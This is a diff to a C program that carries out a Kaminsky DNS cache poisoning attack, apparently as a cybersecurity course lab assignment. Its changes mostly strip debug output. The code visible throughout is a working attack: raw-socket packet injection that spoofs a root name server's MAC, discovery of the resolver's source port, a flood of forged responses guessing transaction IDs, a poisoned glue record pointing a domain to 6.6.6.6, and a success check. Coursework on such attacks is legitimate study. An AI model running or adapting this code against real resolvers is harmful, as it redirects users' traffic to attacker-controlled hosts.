@@ -100,7 +100,7 @@ static int setup_tcp_listener(void)
     return -1;
   }
 
-  printf("TCP listener ready on port %d\n", TCP_PORT);
+  // TCP listener ready on port TCP_PORT
   return sockfd;
 }
 
@@ -112,7 +112,7 @@ static int wait_for_resolver_port_over_tcp(int listen_sock)
   char buf[MAX_LEN_PORT];
   ssize_t n;
 
-  printf("waiting for resolver port from server over TCP...\n");
+  // Waiting for resolver port from server over TCP
 
   conn = accept(listen_sock, (struct sockaddr *)&peer, &peer_len);
   if (conn < 0) {
@@ -128,7 +128,7 @@ static int wait_for_resolver_port_over_tcp(int listen_sock)
   }
 
   buf[n] = '\0';
-  printf("received port: '%s'\n", buf);
+  // Port received from auth server
 
   int port = atoi(buf);
   close(conn);
@@ -292,17 +292,11 @@ static int init_raw_socket(void)
         return -1;
     }
 
-    printf("eth0 MAC: %02x:%02x:%02x:%02x:%02x:%02x (ifindex=%d)\n",
-           g_src_mac[0], g_src_mac[1], g_src_mac[2],
-           g_src_mac[3], g_src_mac[4], g_src_mac[5], ifindex);
-
     // Set source MAC to root NS (for spoofing packets from root server)
     memcpy(g_src_mac, ROOT_NS_MAC, 6);
-    printf("Spoofing as root NS MAC: 02:42:ac:11:00:04\n");
 
     // Set destination MAC to resolver
     memcpy(g_dest_mac, RESOLVER_MAC, 6);
-    printf("Sending to resolver MAC: 02:42:ac:11:00:03\n");
 
     // Setup sockaddr_ll for sendto
     memset(&g_dest_addr, 0, sizeof(g_dest_addr));
@@ -311,7 +305,7 @@ static int init_raw_socket(void)
     g_dest_addr.sll_halen = ETH_ALEN;
     memcpy(g_dest_addr.sll_addr, g_dest_mac, 6);
 
-    printf("Raw socket initialized on eth0\n");
+    // Raw socket initialized on eth0
     return 0;
 }
 
@@ -410,7 +404,7 @@ static int send_dns_query_to_resolver(const char *qname)
         goto cleanup;
     }
 
-    printf("Sent DNS query for %s to resolver %s\n", qname, RESOLVER_IP);
+    // DNS query sent to resolver
     ret = 0;
 
 cleanup:
@@ -438,7 +432,7 @@ static int learn_resolver_source_port(void)
     int listen_sock;
     int port;
 
-    printf("\n=== Learning Resolver Source Port ===\n");
+    printf("Learning resolver source port...\n");
 
     // Setup TCP listener to receive port from our auth server
     listen_sock = setup_tcp_listener();
@@ -448,7 +442,6 @@ static int learn_resolver_source_port(void)
     }
 
     // Send DNS query to resolver for our attacker domain
-    printf("Sending trigger query to resolver...\n");
     if (send_dns_query_to_resolver(trigger_domain) < 0) {
         fprintf(stderr, "Failed to send DNS query\n");
         close(listen_sock);
@@ -456,7 +449,6 @@ static int learn_resolver_source_port(void)
     }
 
     // Wait for our auth server to send us the port over TCP
-    printf("Waiting for auth server to report resolver source port...\n");
     port = wait_for_resolver_port_over_tcp(listen_sock);
     close(listen_sock);
 
@@ -466,8 +458,7 @@ static int learn_resolver_source_port(void)
     }
 
     g_resolver_src_port = (uint16_t)port;
-    printf("\n✓ Resolver source port learned: %u\n", g_resolver_src_port);
-    printf("=====================================\n\n");
+    printf("✓ Resolver source port: %u\n\n", g_resolver_src_port);
 
     return 0;
 }
@@ -500,7 +491,7 @@ static int build_spoofed_response(const char *qname,
     ldns_status status;
     int ret = -1;
 
-    printf("[DEBUG] Building spoofed response for qname=%s, txid=%u\n", qname, txid_guess);
+    // Building spoofed response
 
     // Create new DNS packet
     response = ldns_pkt_new();
@@ -534,7 +525,6 @@ static int build_spoofed_response(const char *qname,
 
     // Answer section: Directly answer the query with poisoned IP
     // This caches the A record for the queried subdomain (e.g., ww0.example1...)
-    printf("[DEBUG] Adding ANSWER: %s A 1.2.3.4\n", qname);
     ldns_rr *answer_rr = ldns_rr_new();
     ldns_rr_set_owner(answer_rr, ldns_dname_new_frm_str(qname));
     ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
@@ -545,7 +535,6 @@ static int build_spoofed_response(const char *qname,
 
     // Authority section: Claim example1.cybercourse.example.com delegates to www.example1...
     // This matches the course example pattern (zone NS target)
-    printf("[DEBUG] Adding AUTHORITY: example1.cybercourse.example.com NS www.example1.cybercourse.example.com\n");
     authority_rr = ldns_rr_new();
     ldns_rr_set_owner(authority_rr, ldns_dname_new_frm_str("example1.cybercourse.example.com"));
     ldns_rr_set_type(authority_rr, LDNS_RR_TYPE_NS);
@@ -556,7 +545,6 @@ static int build_spoofed_response(const char *qname,
 
     // Additional section: Glue record for the NS (THE POISON!)
     // This makes www.example1.cybercourse.example.com resolve to 6.6.6.6
-    printf("[DEBUG] Adding ADDITIONAL: www.example1.cybercourse.example.com A 6.6.6.6\n");
     additional_rr = ldns_rr_new();
     ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("www.example1.cybercourse.example.com"));
     ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A);
@@ -573,7 +561,7 @@ static int build_spoofed_response(const char *qname,
         goto cleanup;
     }
 
-    printf("[DEBUG] Spoofed response serialized: %zu bytes\n", *out_len);
+    // Spoofed response serialized
     ret = 0;
 
 cleanup:
@@ -670,13 +658,10 @@ static void perform_attack_round(int round)
     build_unique_subdomain(round, subdomain, sizeof(subdomain));
 
     /* Step 1: send query to resolver */
-    printf("[Round %d] Querying resolver for: %s\n", round, subdomain);
+    printf("[Round %d] Testing %s...\n", round, subdomain);
     (void)send_dns_query_to_resolver(subdomain);
 
     /* Step 2: flood with spoofed answers trying different TXIDs */
-    printf("[Round %d] Flooding with up to %d spoofed responses...\n",
-           round, MAX_SPOOFED_PKTS);
-    printf("[DEBUG] Query domain: %s, Resolver port: %u\n", subdomain, g_resolver_src_port);
 
     uint8_t *spoofed_dns = NULL;
     size_t spoofed_len = 0;
@@ -704,17 +689,10 @@ static void perform_attack_round(int round)
             spoofed_dns = NULL;
         }
 
-        // Optional: Print progress every 10000 packets
-        if ((i + 1) % 10000 == 0) {
-            printf("  Sent %u/%d packets (TXID range: %u-%u)...\n", 
-                   i + 1, MAX_SPOOFED_PKTS, 
-                   (i + 1 - 10000) % 65536, (i + 1) % 65536);
-        }
+        // Progress tracking (silent)
     }
 
-    printf("[Round %d] Injection complete: %d/%d packets sent successfully\n",
-           round, successful_injections, MAX_SPOOFED_PKTS);
-    printf("[DEBUG] Attempted TXID range: 0-%u (cycling through 65536)\n", MAX_SPOOFED_PKTS % 65536);
+    printf("  → Sent %d packets\n", successful_injections);
 }
 
 /**
@@ -805,12 +783,7 @@ static int check_poisoning(void)
         goto cleanup;
     }
 
-    printf("[DEBUG] Checking poisoning for %s...\n", test_domain);
-    printf("[DEBUG] Response received: %zd bytes\n", recv_len);
-    printf("[DEBUG] Response RCODE: %d\n", ldns_pkt_get_rcode(response));
-    printf("[DEBUG] Answer count: %zu\n", ldns_pkt_ancount(response));
-    printf("[DEBUG] Authority count: %zu\n", ldns_pkt_nscount(response));
-    printf("[DEBUG] Additional count: %zu\n", ldns_pkt_arcount(response));
+    // Check response details
 
     // Check answer section for A record pointing to 6.6.6.6
     ldns_rr_list *answer = ldns_pkt_answer(response);
@@ -822,36 +795,17 @@ static int check_poisoning(void)
                 if (a_rdf) {
                     char *ip_str = ldns_rdf2str(a_rdf);
                     if (ip_str) {
-                        printf("[DEBUG] Found A record: %s\n", ip_str);
                         // Compare IP (strip trailing dot/whitespace if present)
                         if (strncmp(ip_str, poison_ip, strlen(poison_ip)) == 0) {
-                            printf("\n✓ Cache poisoning SUCCESS! %s resolves to %s\n",
+                            printf("\n✓ CACHE POISONED! %s → %s\n",
                                    test_domain, ip_str);
                             poisoned = 1;
                             free(ip_str);
                             break;
-                        } else {
-                            printf("[DEBUG] IP mismatch: expected %s, got %s\n", poison_ip, ip_str);
                         }
                         free(ip_str);
                     }
                 }
-            }
-        }
-    } else {
-        printf("[DEBUG] No answer section in response\n");
-    }
-
-    // Also check authority section
-    ldns_rr_list *authority = ldns_pkt_authority(response);
-    if (authority && ldns_rr_list_rr_count(authority) > 0) {
-        printf("[DEBUG] Authority section has %zu records:\n", ldns_rr_list_rr_count(authority));
-        for (size_t i = 0; i < ldns_rr_list_rr_count(authority); i++) {
-            ldns_rr *rr = ldns_rr_list_rr(authority, i);
-            char *rr_str = ldns_rr2str(rr);
-            if (rr_str) {
-                printf("[DEBUG]   %s", rr_str);
-                free(rr_str);
             }
         }
     }
@@ -877,18 +831,16 @@ int main(void)
     (void)srand((unsigned int)time(NULL));
 
     printf("=== Kaminsky DNS Cache Poisoning Attack ===\n\n");
-
-    printf("Step 1: Initialize raw socket for packet injection\n");
     if (init_raw_socket() != 0) {
         return EXIT_FAILURE;
     }
 
-    printf("Step 2: Learning resolver source port...\n");
+    // Learning resolver source port
     if (learn_resolver_source_port() != 0) {
         goto cleanup;
     }
 
-    printf("Step 3: Starting Kaminsky attack rounds...\n");
+    printf("Starting attack rounds...\n");
     /* Main Kaminsky-style loop: multiple attack windows with different subdomains. */
     for (int round = 0; round < MAX_ROUNDS; ++round) {
         perform_attack_round(round);
